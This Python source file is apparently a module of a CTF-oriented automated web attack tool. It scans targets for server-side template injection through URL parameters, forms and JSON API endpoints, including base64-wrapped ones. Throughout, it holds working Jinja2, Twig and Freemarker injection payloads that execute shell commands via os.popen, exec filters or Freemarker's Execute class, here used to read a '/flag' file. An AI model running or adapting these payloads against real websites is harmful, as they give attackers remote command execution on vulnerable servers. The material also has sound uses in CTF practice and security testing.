"""yang_web.core.multi_stage._engine 混入 _SstiStages —— SSTI 阶段与利用细节（含 JSON 接口 SSTI）。"""

from __future__ import annotations
import json
import base64
import urllib.request
import urllib.error
import urllib.parse
from urllib.parse import urljoin
from typing import Dict, List, Optional, Tuple, Set, Callable
from ._common import (COMMON_CREDENTIALS, FLAG_RE, LFI_PAYLOADS, XXE_PAYLOADS)

class _SstiStages:
    """SSTI 阶段与利用细节（含 JSON 接口 SSTI）。"""


    def _stage_ssti(self, url: str, resp: dict, analysis: dict,
                    _emit, _found) -> Optional[str]:
        """SSTI 阶段: Jinja2/Twig/Freemarker 全面探测."""
        _emit("attack", "SSTI 全面探测", "Jinja2/Twig/Freemarker...")

        # 收集所有可能的注入点
        all_inputs = set(analysis.get("inputs", []))
        # 补全常见参数名
        all_inputs.update(["name", "input", "msg", "q", "s", "search", "query",
                          "data", "text", "value", "content", "page", "id", "cmd"])

        # Jinja2 探测载荷
        probes = [
            ("{{7*7}}", "49", False),
            ("${7*7}", "49", False),
            ("{{config}}", "<Config", False),
            ("{{request}}", "<Request", False),
            ("{{''.__class__}}", "str", False),
        ]

        # 对每个参数，尝试 GET 和 POST
        for probe_text, expect, is_flag in probes:
            if self._cancelled:
                break
            for param in sorted(all_inputs)[:15]:
                if self._cancelled:
                    break
                # GET test
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(probe_text)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                if expect in body2:
                    _emit("ssti_hit", param, f"{probe_text} -> {expect} detected!")
                    return self._ssti_exploit(url, resp, param, _emit, _found)

            # POST test on forms
            if analysis.get("forms"):
                for fdata in analysis["forms"]:
                    for param in fdata.get("inputs", []) + fdata.get("textarea", []):
                        if self._cancelled:
                            break
                        test_data = urllib.parse.urlencode({param: probe_text}).encode()
                        resp3 = self.http.request(url, method="POST", data=test_data)
                        body3 = resp3.get("body", "")
                        if expect in body3:
                            _emit("ssti_hit", f"POST/{param}", f"{probe_text} -> {expect} detected!")
                            return self._ssti_exploit(url, resp, param, _emit, _found)

        # JS API endpoint detection: find fetch()/xhr paths in page source
        js_endpoints = self._extract_api_endpoints(resp.get("body", ""), self._base_url)
        if js_endpoints and self._cancelled == False:
            _emit("ssti_hint", "JS endpoints", f"Found {len(js_endpoints)} API paths")
            for ep in js_endpoints[:5]:
                if self._cancelled:
                    break
                api_url = urljoin(self._base_url or url, ep)
                result = self._try_json_ssti(api_url, _emit, _found)
                if result:
                    return result

        return None

    def _ssti_exploit(self, url: str, resp: dict, param: str,
                      _emit, _found) -> Optional[str]:
        """SSTI 确认后尝试 RCE 读 Flag."""
        _emit("ssti_exploit", param, "尝试 RCE 链...")

        rce_payloads = [
            # Jinja2 - popen
            "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
            "{{cycler.__init__.__globals__.os.popen('cat /fla*').read()}}",
            "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
            "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
            # Jinja2 - config-based
            "{{config.__init__.__globals__['os'].popen('cat /flag').read()}}",
            "{{config.items()}}",
            # Jinja2 - subprocess
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            # Jinja2 - eval
            "{{url_for.__globals__['current_app'].config}}",
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag')}}",
            # Freemarker
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag\")}",
        ]

        for rce in rce_payloads:
            if self._cancelled:
                break
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(rce)}"
            resp2 = self.http.request(test_url)
            body2 = resp2.get("body", "")
            flag = FLAG_RE.search(body2)
            if flag:
                _found(flag.group(0))
                return None
            # Also try POST
            test_data = urllib.parse.urlencode({param: rce}).encode()
            resp3 = self.http.request(url, method="POST", data=test_data)
            body3 = resp3.get("body", "")
            flag2 = FLAG_RE.search(body3)
            if flag2:
                _found(flag2.group(0))
                return None

        return None

    def _try_json_ssti(self, api_url: str, _emit, _found) -> Optional[str]:
        """Try SSTI via JSON API with base64 awareness."""
        # Standard JSON SSTI
        probes = ["{{7*7}}", "{{config}}", "{{''.__class__}}"]
        for probe in probes:
            if self._cancelled:
                break
            payloads = []
            # Direct JSON in various key names
            for key in ("data", "name", "msg", "query", "value", "input",
                       "achilles_distance", "tortoise_distance", "key", "id"):
                payloads.append(json.dumps({key: probe}).encode())
            # Base64-wrapped pattern: JS encryptData style
            for key in ("data", "payload", "request", "body"):
                inner = json.dumps({key: probe}, separators=(',', ':'))
                b64 = base64.b64encode(inner.encode()).decode()
                payloads.append(json.dumps({"data": b64}).encode())
                payloads.append(json.dumps({"payload": b64}).encode())
            # Base64 with number + string (mixed fields pattern)
            inner_mixed = json.dumps({"achilles_distance": probe, "tortoise_distance": 100}, separators=(',', ':'))
            b64_m = base64.b64encode(inner_mixed.encode()).decode()
            payloads.append(json.dumps({"data": b64_m}).encode())
            for data in payloads:
                if self._cancelled:
                    break
                resp = self.http.request(api_url, method="POST", data=data,
                    headers={"Content-Type": "application/json"})
                body = resp.get("body", "")
                # Base64-decode response first (modern CTF pattern)
                decoded_bodies = [body]
                try:
                    resp_json = json.loads(body)
                    for key in ("data", "result", "response", "flag", "message"):
                        val = resp_json.get(key, "")
                        if isinstance(val, str):
                            try:
                                decoded = base64.b64decode(val).decode()
                                decoded_bodies.append(decoded)
                                flag = FLAG_RE.search(decoded)
                                if flag:
                                    _found(flag.group(0))
                                    return None
                            except Exception:
                                pass
                except Exception:
                    pass
                # Check decoded bodies for SSTI
                for db in decoded_bodies:
                    if "49" in db:
                        _emit("ssti_hit_json", api_url[-40:], f"{probe} -> 49!")
                        return self._ssti_json_rce(api_url, _emit, _found)
                    if "<Config" in db or "SECRET" in db:
                        _emit("ssti_hit_json", api_url[-40:], f"{probe} -> CONFIG leak!")
                        return None
        return None

    def _ssti_json_rce(self, api_url: str, _emit, _found) -> Optional[str]:
        """SSTI confirmed on JSON API — try RCE via standard + base64 paths."""
        _emit("ssti_exploit", "JSON API", "attempting RCE...")
        rce_list = [
            "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
            "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
            "{{config.__init__.__globals__['os'].popen('cat /flag').read()}}",
        ]
        for rce in rce_list:
            if self._cancelled:
                break
            # Standard JSON
            rce_data = json.dumps({"data": rce}).encode()
            resp = self.http.request(api_url, method="POST", data=rce_data,
                headers={"Content-Type": "application/json"})
            body = resp.get("body", "")
            # Base64 decode
            try:
                j = json.loads(body)
                for k in ("data", "result", "response", "flag"):
                    v = j.get(k, "")
                    if isinstance(v, str):
                        try:
                            d = base64.b64decode(v).decode()
                            f = FLAG_RE.search(d)
                            if f:
                                _found(f.group(0))
                                return None
                        except Exception:
                            pass
            except Exception:
                pass
            f = FLAG_RE.search(body)
            if f:
                _found(f.group(0))
                return None
        return None
